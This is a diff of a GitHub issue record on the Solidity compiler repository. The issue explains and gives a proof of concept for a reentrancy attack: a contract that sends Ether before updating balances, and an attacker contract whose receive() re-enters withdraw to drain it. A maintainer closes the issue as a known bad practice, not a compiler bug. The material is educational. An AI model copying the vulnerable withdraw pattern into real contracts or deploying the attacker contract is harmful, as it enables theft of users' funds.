@@ -40,21 +40,40 @@
       "description": ""
     }
   ],
-  "state": "open",
+  "state": "closed",
   "locked": false,
   "assignee": null,
   "assignees": [
 
   ],
   "milestone": null,
-  "comments": 0,
+  "comments": 1,
   "created_at": "2023-10-15T04:39:45Z",
-  "updated_at": "2023-10-15T04:39:45Z",
-  "closed_at": null,
+  "updated_at": "2023-10-16T10:53:08Z",
+  "closed_at": "2023-10-16T10:53:08Z",
   "author_association": "NONE",
   "active_lock_reason": null,
-  "body": "This code consists of two Solidity contracts: VulnerableContract and AttackerContract. Let's break down what each contract does:\r\n\r\nVulnerableContract:\r\ncontract VulnerableContract {\r\n    mapping(address => uint) public balances;\r\n\r\n    function deposit() public payable {\r\n        balances[msg.sender] += msg.value;\r\n    }\r\n\r\n    function withdraw(uint _amount) public {\r\n        require(balances[msg.sender] >= _amount, \"Insufficient funds\");\r\n        (bool success, ) = msg.sender.call{value: _amount}(\"\");\r\n        require(success, \"Transfer failed\");\r\n        balances[msg.sender] -= _amount;\r\n    }\r\n}\r\n\r\nVulnerableContract is a contract that maintains a mapping of addresses to balances. It has two main functions:\r\n\r\ndeposit(): This function allows anyone to send Ether to the contract. The Ether sent is added to the balance of the sender's address (msg.sender).\r\n\r\nwithdraw(uint _amount): This function allows a user to withdraw a specified amount of Ether. It first checks if the user has sufficient funds, and if so, attempts to send the Ether back to the user (msg.sender). If the transfer is successful, it updates the balance accordingly.\r\n\r\nAttackerContract:\r\ncontract AttackerContract {\r\n    VulnerableContract public vulnerableContract;\r\n\r\n    constructor(address _vulnerableContractAddress) {\r\n        vulnerableContract = VulnerableContract(_vulnerableContractAddress);\r\n    }\r\n\r\n    function attack() public payable {\r\n        vulnerableContract.deposit{value: msg.value}();\r\n        vulnerableContract.withdraw(msg.value);\r\n    }\r\n\r\n    receive() external payable {\r\n        if (address(vulnerableContract).balance >= msg.value) {\r\n            vulnerableContract.withdraw(msg.value);\r\n        }\r\n    }\r\n\r\n    function getBalance() public view returns(uint) {\r\n        return address(this).balance;\r\n    }\r\n\r\n    function withdrawFunds() public {\r\n        (bool success, ) = msg.sender.call{value: address(this).balance}(\"\");\r\n        require(success, \"Transfer failed\");\r\n    }\r\n}\r\n\r\nAttackerContract is a contract designed to exploit the vulnerabilities in VulnerableContract.\r\n\r\nIn the constructor, it takes the address of an existing VulnerableContract as an argument and initializes a VulnerableContract instance.\r\n\r\nattack(): This function simulates an attack. It first deposits an amount of Ether (msg.value) into the vulnerable contract and then immediately tries to withdraw the same amount. This sequence of actions is intended to exploit the reentrancy vulnerability.\r\n\r\nreceive(): This function is a special function that is called whenever the contract receives Ether. It checks if the balance of the vulnerableContract is greater than or equal to the amount of Ether received (msg.value). If so, it attempts to withdraw the Ether from the vulnerableContract.\r\n\r\ngetBalance(): This function returns the balance of the AttackerContract.\r\n\r\nwithdrawFunds(): This function allows the owner of the AttackerContract to withdraw any Ether held by the contract.\r\n\r\nSummary:\r\nThe VulnerableContract has a vulnerability related to reentrancy in the withdraw function. The AttackerContract is designed to take advantage of this vulnerability by depositing Ether and then repeatedly calling withdraw in a way that allows it to repeatedly re-enter the withdraw function before the balance is updated. This can potentially lead to an unintended transfer of funds.\r\n\r\n\r\n\r\nPoC Below:\r\n`// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract VulnerableContract {\r\n    mapping(address => uint) public balances;\r\n\r\n    function deposit() public payable {\r\n        balances[msg.sender] += msg.value;\r\n    }\r\n\r\n    function withdraw(uint _amount) public {\r\n        require(balances[msg.sender] >= _amount, \"Insufficient funds\");\r\n        (bool success, ) = msg.sender.call{value: _amount}(\"\");\r\n        require(success, \"Transfer failed\");\r\n        balances[msg.sender] -= _amount;\r\n    }\r\n}\r\n\r\ncontract AttackerContract {\r\n    VulnerableContract public vulnerableContract;\r\n\r\n    constructor(address _vulnerableContractAddress) {\r\n        vulnerableContract = VulnerableContract(_vulnerableContractAddress);\r\n    }\r\n\r\n    function attack() public payable {\r\n        vulnerableContract.deposit{value: msg.value}();\r\n        vulnerableContract.withdraw(msg.value);\r\n    }\r\n\r\n    receive() external payable {\r\n        if (address(vulnerableContract).balance >= msg.value) {\r\n            vulnerableContract.withdraw(msg.value);\r\n        }\r\n    }\r\n\r\n    function getBalance() public view returns(uint) {\r\n        return address(this).balance;\r\n    }\r\n\r\n    function withdrawFunds() public {\r\n        (bool success, ) = msg.sender.call{value: address(this).balance}(\"\");\r\n        require(success, \"Transfer failed\");\r\n    }\r\n}\r\n`\r\n",
-  "closed_by": null,
+  "body": "This code consists of two Solidity contracts: VulnerableContract and AttackerContract. Let's break down what each contract does:\r\n\r\nVulnerableContract:\r\n```solidity\r\ncontract VulnerableContract {\r\n    mapping(address => uint) public balances;\r\n\r\n    function deposit() public payable {\r\n        balances[msg.sender] += msg.value;\r\n    }\r\n\r\n    function withdraw(uint _amount) public {\r\n        require(balances[msg.sender] >= _amount, \"Insufficient funds\");\r\n        (bool success, ) = msg.sender.call{value: _amount}(\"\");\r\n        require(success, \"Transfer failed\");\r\n        balances[msg.sender] -= _amount;\r\n    }\r\n}\r\n```\r\n\r\nVulnerableContract is a contract that maintains a mapping of addresses to balances. It has two main functions:\r\n\r\ndeposit(): This function allows anyone to send Ether to the contract. The Ether sent is added to the balance of the sender's address (msg.sender).\r\n\r\nwithdraw(uint _amount): This function allows a user to withdraw a specified amount of Ether. It first checks if the user has sufficient funds, and if so, attempts to send the Ether back to the user (msg.sender). If the transfer is successful, it updates the balance accordingly.\r\n\r\nAttackerContract:\r\n```solidity\r\ncontract AttackerContract {\r\n    VulnerableContract public vulnerableContract;\r\n\r\n    constructor(address _vulnerableContractAddress) {\r\n        vulnerableContract = VulnerableContract(_vulnerableContractAddress);\r\n    }\r\n\r\n    function attack() public payable {\r\n        vulnerableContract.deposit{value: msg.value}();\r\n        vulnerableContract.withdraw(msg.value);\r\n    }\r\n\r\n    receive() external payable {\r\n        if (address(vulnerableContract).balance >= msg.value) {\r\n            vulnerableContract.withdraw(msg.value);\r\n        }\r\n    }\r\n\r\n    function getBalance() public view returns(uint) {\r\n        return address(this).balance;\r\n    }\r\n\r\n    function withdrawFunds() public {\r\n        (bool success, ) = msg.sender.call{value: address(this).balance}(\"\");\r\n        require(success, \"Transfer failed\");\r\n    }\r\n}\r\n```\r\nAttackerContract is a contract designed to exploit the vulnerabilities in VulnerableContract.\r\n\r\nIn the constructor, it takes the address of an existing VulnerableContract as an argument and initializes a VulnerableContract instance.\r\n\r\nattack(): This function simulates an attack. It first deposits an amount of Ether (msg.value) into the vulnerable contract and then immediately tries to withdraw the same amount. This sequence of actions is intended to exploit the reentrancy vulnerability.\r\n\r\nreceive(): This function is a special function that is called whenever the contract receives Ether. It checks if the balance of the vulnerableContract is greater than or equal to the amount of Ether received (msg.value). If so, it attempts to withdraw the Ether from the vulnerableContract.\r\n\r\ngetBalance(): This function returns the balance of the AttackerContract.\r\n\r\nwithdrawFunds(): This function allows the owner of the AttackerContract to withdraw any Ether held by the contract.\r\n\r\nSummary:\r\nThe VulnerableContract has a vulnerability related to reentrancy in the withdraw function. The AttackerContract is designed to take advantage of this vulnerability by depositing Ether and then repeatedly calling withdraw in a way that allows it to repeatedly re-enter the withdraw function before the balance is updated. This can potentially lead to an unintended transfer of funds.\r\n\r\n\r\n\r\nPoC Below:\r\n```solidity\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract VulnerableContract {\r\n    mapping(address => uint) public balances;\r\n\r\n    function deposit() public payable {\r\n        balances[msg.sender] += msg.value;\r\n    }\r\n\r\n    function withdraw(uint _amount) public {\r\n        require(balances[msg.sender] >= _amount, \"Insufficient funds\");\r\n        (bool success, ) = msg.sender.call{value: _amount}(\"\");\r\n        require(success, \"Transfer failed\");\r\n        balances[msg.sender] -= _amount;\r\n    }\r\n}\r\n\r\ncontract AttackerContract {\r\n    VulnerableContract public vulnerableContract;\r\n\r\n    constructor(address _vulnerableContractAddress) {\r\n        vulnerableContract = VulnerableContract(_vulnerableContractAddress);\r\n    }\r\n\r\n    function attack() public payable {\r\n        vulnerableContract.deposit{value: msg.value}();\r\n        vulnerableContract.withdraw(msg.value);\r\n    }\r\n\r\n    receive() external payable {\r\n        if (address(vulnerableContract).balance >= msg.value) {\r\n            vulnerableContract.withdraw(msg.value);\r\n        }\r\n    }\r\n\r\n    function getBalance() public view returns(uint) {\r\n        return address(this).balance;\r\n    }\r\n\r\n    function withdrawFunds() public {\r\n        (bool success, ) = msg.sender.call{value: address(this).balance}(\"\");\r\n        require(success, \"Transfer failed\");\r\n    }\r\n}\r\n```\r\n",
+  "closed_by": {
+    "login": "r0qs",
+    "id": 457348,
+    "node_id": "MDQ6VXNlcjQ1NzM0OA==",
+    "avatar_url": "https://avatars.githubusercontent.com/u/457348?v=4",
+    "gravatar_id": "",
+    "url": "https://api.github.com/users/r0qs",
+    "html_url": "https://github.com/r0qs",
+    "followers_url": "https://api.github.com/users/r0qs/followers",
+    "following_url": "https://api.github.com/users/r0qs/following{/other_user}",
+    "gists_url": "https://api.github.com/users/r0qs/gists{/gist_id}",
+    "starred_url": "https://api.github.com/users/r0qs/starred{/owner}{/repo}",
+    "subscriptions_url": "https://api.github.com/users/r0qs/subscriptions",
+    "organizations_url": "https://api.github.com/users/r0qs/orgs",
+    "repos_url": "https://api.github.com/users/r0qs/repos",
+    "events_url": "https://api.github.com/users/r0qs/events{/privacy}",
+    "received_events_url": "https://api.github.com/users/r0qs/received_events",
+    "type": "User",
+    "site_admin": false
+  },
   "reactions": {
     "url": "https://api.github.com/repos/ethereum/solidity/issues/14618/reactions",
     "total_count": 0,
@@ -69,8 +88,51 @@
   },
   "timeline_url": "https://api.github.com/repos/ethereum/solidity/issues/14618/timeline",
   "performed_via_github_app": null,
-  "state_reason": null
+  "state_reason": "completed"
 }
 [
-
+  {
+    "url": "https://api.github.com/repos/ethereum/solidity/issues/comments/1764215300",
+    "html_url": "https://github.com/ethereum/solidity/issues/14618#issuecomment-1764215300",
+    "issue_url": "https://api.github.com/repos/ethereum/solidity/issues/14618",
+    "id": 1764215300,
+    "node_id": "IC_kwDOAm_5kc5pJ8oE",
+    "user": {
+      "login": "r0qs",
+      "id": 457348,
+      "node_id": "MDQ6VXNlcjQ1NzM0OA==",
+      "avatar_url": "https://avatars.githubusercontent.com/u/457348?v=4",
+      "gravatar_id": "",
+      "url": "https://api.github.com/users/r0qs",
+      "html_url": "https://github.com/r0qs",
+      "followers_url": "https://api.github.com/users/r0qs/followers",
+      "following_url": "https://api.github.com/users/r0qs/following{/other_user}",
+      "gists_url": "https://api.github.com/users/r0qs/gists{/gist_id}",
+      "starred_url": "https://api.github.com/users/r0qs/starred{/owner}{/repo}",
+      "subscriptions_url": "https://api.github.com/users/r0qs/subscriptions",
+      "organizations_url": "https://api.github.com/users/r0qs/orgs",
+      "repos_url": "https://api.github.com/users/r0qs/repos",
+      "events_url": "https://api.github.com/users/r0qs/events{/privacy}",
+      "received_events_url": "https://api.github.com/users/r0qs/received_events",
+      "type": "User",
+      "site_admin": false
+    },
+    "created_at": "2023-10-16T10:53:08Z",
+    "updated_at": "2023-10-16T10:53:08Z",
+    "author_association": "MEMBER",
+    "body": "Hi @SleepTheGod this is not a compiler issue but a well-know bad practice that you should avoid. Please see: https://docs.soliditylang.org/en/latest/security-considerations.html#reentrancy to learn how to avoid such pattern.",
+    "reactions": {
+      "url": "https://api.github.com/repos/ethereum/solidity/issues/comments/1764215300/reactions",
+      "total_count": 0,
+      "+1": 0,
+      "-1": 0,
+      "laugh": 0,
+      "hooray": 0,
+      "confused": 0,
+      "heart": 0,
+      "rocket": 0,
+      "eyes": 0
+    },
+    "performed_via_github_app": null
+  }
 ]
